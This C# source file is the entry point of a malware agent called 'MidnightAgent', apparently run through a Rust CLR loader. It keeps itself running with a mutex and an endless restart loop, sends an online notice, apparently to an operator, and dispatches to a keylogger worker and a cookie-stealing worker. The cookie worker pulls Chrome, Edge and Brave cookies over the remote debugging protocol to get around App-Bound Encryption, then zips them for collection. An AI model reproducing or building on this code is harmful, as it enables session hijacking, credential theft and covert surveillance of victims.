using System;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using MidnightAgent.Core;
using MidnightAgent.Installation;
using MidnightAgent.Security;
using MidnightAgent.Utils;

namespace MidnightAgent
{
    public class Program
    {
        // Entry point for CLR Host (Rust)
        // Returns 0 on success, other values on failure
        public static int Run(string argument)
        {
            // When called from Rust loader, skip installation logic
            // and go straight to running the agent with retry loop
            using (var mutex = new Mutex(true, "MidnightAgent_Mutex", out bool isNew))
            {
                if (!isNew) return 1; // Already running

                // Send Online notification ONCE (before retry loop)
                bool notified = false;

                // Infinite retry loop to keep agent alive
                while (true)
                {
                    try
                    {
                        System.Diagnostics.Debug.WriteLine("[MidnightAgent] Starting agent...");
                        
                        Agent agent = new Agent();
                        
                        // Only send notification on first successful start
                        if (!notified)
                        {
                            agent.SendOnlineNotificationOnce();
                            notified = true;
                        }
                        
                        agent.Run(); // This is blocking
                        
                        // If we get here, agent stopped gracefully
                        System.Diagnostics.Debug.WriteLine("[MidnightAgent] Agent stopped gracefully");
                        break;
                    }
                    catch (Exception ex)
                    {
                        System.Diagnostics.Debug.WriteLine($"[MidnightAgent] Critical Error: {ex}");
                        System.Diagnostics.Debug.WriteLine($"[MidnightAgent] Restarting in 5 seconds...");
                        
                        // Wait before retry
                        Thread.Sleep(5000);
                    }
                }
            }
            return 0;
        }

        [STAThread]
        public static void Main(string[] args)
        {
            // Worker Mode (for cookies / user context tasks)
            if (args.Length >= 2 && args[0] == "--cookie-worker")
            {
                RunCookieWorker(args[1]);
                return;
            }
            else if (args.Length >= 2 && args[0] == "--keylogger-worker")
            {
                KeyloggerWorker.Run(args[1]);
                return;
            }

            // When executed by ClrOxide, Main() becomes the entry point
            // The Run method handles duplicate instances via Mutex
            Run("");
        }

        static void RunCookieWorker(string zipPath)
        {
            string debugLog = Path.Combine(Path.GetTempPath(), "cookie_debug.log");
            File.WriteAllText(debugLog, $"Worker started at {DateTime.Now}\n");

            try
            {
                string tempDir = Path.Combine(Path.GetTempPath(), $"cookies_{Guid.NewGuid():N}");
                Directory.CreateDirectory(tempDir);

                StringBuilder debug = new StringBuilder();
                
                // Use Remote Debugging Protocol to bypass v20 App-Bound Encryption
                File.AppendAllText(debugLog, "Using Remote Debugging Protocol...\n");
                
                // Extract from Chrome
                ExtractViaDebugger("chrome", "Chrome", tempDir, debugLog);
                
                // Extract from Edge
                ExtractViaDebugger("edge", "Edge", tempDir, debugLog);
                
                // Extract from Brave
                ExtractViaDebugger("brave", "Brave", tempDir, debugLog);

                // Copy log to temp dir
                File.AppendAllText(debugLog, "Zipping results...\n");
                File.Copy(debugLog, Path.Combine(tempDir, "debug.log"));

                // Zip results
                if (File.Exists(zipPath)) File.Delete(zipPath);
                ZipFile.CreateFromDirectory(tempDir, zipPath);

                // Cleanup
                try { Directory.Delete(tempDir, true); } catch { }
            }
            catch (Exception ex)
            {
                File.AppendAllText(debugLog, $"Critical Error: {ex}\n"); 
            }
        }

        static void ExtractViaDebugger(string browserName, string displayName, string outputDir, string logFile)
        {
            try
            {
                File.AppendAllText(logFile, $"Extracting {displayName} via Remote Debug...\n");
                
                StringBuilder debug = new StringBuilder();
                string result = RemoteDebugger.ExtractCookies(browserName, debug);
                
                // Log debug info
                if (debug.Length > 0)
                {
                    File.AppendAllText(logFile, $"[{displayName} Debug]\n{debug}\n");
                }
                
                if (!string.IsNullOrEmpty(result) && !result.StartsWith("Error"))
                {
                    File.WriteAllText(Path.Combine(outputDir, $"{displayName}_cookies.txt"), result);
                    File.AppendAllText(logFile, $"Success! {result.Split('\n').Length} cookies.\n");
                }
                else
                {
                    File.AppendAllText(logFile, $"{displayName} Result: {result}\n");
                }
            }
            catch (Exception ex)
            {
                File.AppendAllText(logFile, $"Error extracting {displayName}: {ex.Message}\n");
            }
        }
    }
}
